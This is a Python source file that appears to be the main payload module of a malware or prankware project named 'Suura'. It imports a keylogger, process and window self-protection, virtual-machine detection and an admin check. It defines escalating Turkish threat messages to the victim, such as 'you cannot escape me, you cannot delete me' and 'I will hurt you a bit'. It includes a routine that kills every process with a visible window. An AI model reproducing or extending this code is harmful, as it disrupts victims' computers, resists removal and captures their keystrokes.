import os
import time
import signal
import warnings
from Suura.includes.protect import ProcessProtection
from Suura.includes.protect import WindowProtection
from Suura.includes.key_logger import KeySniffer
from Suura.includes.util import AudioPlayer,EnumerateActiveWindow
from Suura import get_exe_assets as lib_path
from Suura import to_nt_path
from Suura.includes.util import is_admin,is_running_wmware,SetBackground,get_pid_from_window_hwnd
from Suura.includes.payloads.notepad_payload import TyperPayload
from Suura.includes.msgbox import *

class SuuraMainPayload:
    def __init__(self,parent = None):
        self.parent = parent
        self.stages = {
            1:{
                "user_warning_msg":"Benden kaçamazsın beni silemezsin",
                "valid_accept_msg":[],
                "user_preffered_good_choice":"",
                "user_preffered_non_good_choice":"",
                "what_can_i_do":[]
            },
            2:{
                "user_warning_msg":"Seni uyardım ama hala anlamamışsın belli ki biraz canını yakacağım ",
                "valid_accept_msg":[],
                "user_preffered_good_choice":"",
                "user_prefferred_non_good_choice":"",
                "what_can_i_do":[]
            },
            3:{
                "user_warning_msg":"Seni uyardım ama hala anlamamışsın belli ki biraz canını yakacağım ",
                "valid_accept_msg":[],
                "user_preffered_good_choice":"",
                "user_prefferred_non_good_choice":"",
                "what_can_i_do":[]
            },
            4:{
                "user_warning_msg":"Sanırsam biraz sert davranmam gerek",
                "valid_accept_msg":[],
                "user_preffered_good_choice":"",
                "user_preffered_non_good_choice":"",
                "what_can_i_do":[lambda:self.parent]
            }
        }
    def kill_all_process(self):
        for window_names,window_hwnd in EnumerateActiveWindow().items():
            try:
                process_id = get_pid_from_window_hwnd(window_names,window_hwnd)
                os.kill(process_id,signal.SIGTERM)
            except:
                pass
    def open_notepad_maximized(self):
        os.system("cmd.exe /c start /max notepad.exe")
    def callback(self):
        pass

